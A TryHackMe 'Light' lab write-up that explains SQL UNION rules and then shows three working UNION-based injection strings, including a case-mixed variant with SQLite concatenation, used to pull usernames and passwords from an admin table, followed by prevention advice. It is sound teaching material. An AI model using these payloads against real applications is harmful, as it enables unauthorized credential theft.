# 6. UNION-Based SQL Injection

## What is UNION?

`UNION` is an SQL operator that combines the results of two or more `SELECT` statements into a single result set.

Example:

```sql
SELECT username FROM users
UNION
SELECT username FROM admintable;
```

This combines usernames returned by both queries.

## Rules of UNION

### 1. Same number of columns

Both SELECT statements must return the same number of result columns.

Valid example:

```sql
SELECT id, username FROM users
UNION
SELECT id, username FROM admintable;
```

The two SELECT statements each return two columns.

An attempted UNION where one SELECT returns two columns and the other returns one column is invalid because the result column counts do not match.

### 2. Compatible data types

Corresponding columns must have compatible data types according to the database engine's rules.

SQLite uses flexible typing, so it may allow combinations that stricter database engines reject.

### 3. UNION removes duplicate rows

`UNION` removes duplicate rows from the combined result.

### 4. UNION ALL retains duplicate rows

`UNION ALL` retains duplicate rows. It does not perform duplicate elimination.

| UNION | UNION ALL |
|---|---|
| Combines result sets | Combines result sets |
| Removes duplicate rows | Retains duplicate rows |
| Performs duplicate elimination | Does not perform duplicate elimination |

Duplicate checking applies to the complete row, not just one selected column.

## What is UNION-based SQL injection?

UNION-based SQL injection occurs when an attacker manipulates a vulnerable query to combine its original results with results from another SELECT statement.

If the application displays the combined result, data from another table may be exposed.

## Light challenge: investigation context

The application returned a password value from its original query. Earlier schema discovery identified the following table and columns:

| Table | Columns |
|---|---|
| `admintable` | `id`, `username`, `password` |

The discovered table structure helped identify which fields were relevant to the challenge questions.

## Data extraction observations

The following inputs were tested through the vulnerable Light challenge application. The application context supplied the original query structure and closing quote.

### Test 1: Retrieve the administrator username

**TryHackMe Question 1**

```sql
smokey' UNION SELECT username FROM admintable WHERE 1=1 AND '1'='1
```

**Explanation:**

- `UNION SELECT` introduces another SELECT result.
- `username` specifies the requested column.
- `FROM admintable` specifies the table.
- `WHERE 1=1` is an always-true condition.
- `AND '1'='1` adds another true condition.

**Observation:** The application returned the administrator username.

**Result:** The information required for Question 1 was retrieved.

### Test 2: Retrieve password information using concatenation

**TryHackMe Question 2**

```sql
smokey' UniOn SeLeCt id || ':' || password FROM admintable WHERE 1=1 AND '1
```

This input uses SQLite's string concatenation operator `||`.

Example:

```sql
SELECT '1' || ':' || 'example123';
```

Output:

```text
1:example123
```

The expression:

```sql
id || ':' || password
```

combines the ID, a colon separator, and the password into one output column.

This is useful in a UNION query when the original query returns one column: the two values can be represented as one concatenated result column.

**Observation:** The application returned the password information required for Question 2.

**Result:** The information required for Question 2 was retrieved.

### Test 3: Retrieve the TryHackMe flag

**TryHackMe Question 3**

```sql
smokey' UNION SELECT password FROM admintable WHERE 1=1 AND '1'='1
```

**Explanation:**

- `UNION` combines the original query result with another SELECT result.
- `SELECT password` requests the password column.
- `FROM admintable` specifies the table.
- `WHERE 1=1` is always TRUE.
- `AND '1'='1` adds another TRUE condition.

**Observation:** The application returned the flag required for Question 3.

**Result:** The challenge flag was retrieved.

## Summary of extraction results

| TryHackMe question | Information retrieved | Technique |
|---|---|---|
| Question 1 | Administrator username | UNION SELECT |
| Question 2 | Password information | UNION SELECT with SQLite string concatenation |
| Question 3 | Challenge flag | UNION SELECT |

Actual credentials and the flag are intentionally not reproduced in this public write-up.

## Security impact

UNION-based SQL injection may allow an attacker to:

- Retrieve information from other database tables.
- Expose usernames and password-related information.
- Access confidential application data.
- Learn information that the application was not intended to display.

The actual impact depends on the vulnerable query, database permissions, and how the application displays results.

## Prevention

- Use parameterized queries (prepared statements).
- Apply least-privilege permissions to database accounts.
- Avoid constructing SQL queries through unsafe string concatenation.
- Validate input according to application requirements.
- Avoid exposing detailed database errors to end users.
- Do not rely on keyword filtering as the primary defence.

## Key takeaways

1. UNION combines the results of SELECT statements.
2. Both SELECT statements must return the same number of columns.
3. Corresponding columns must have compatible data types.
4. UNION removes duplicates; UNION ALL retains them.
5. SQLite uses `||` for string concatenation.
6. Schema discovery helps identify relevant tables and columns.
7. Unsafe query construction can expose data from tables beyond the application's intended functionality.
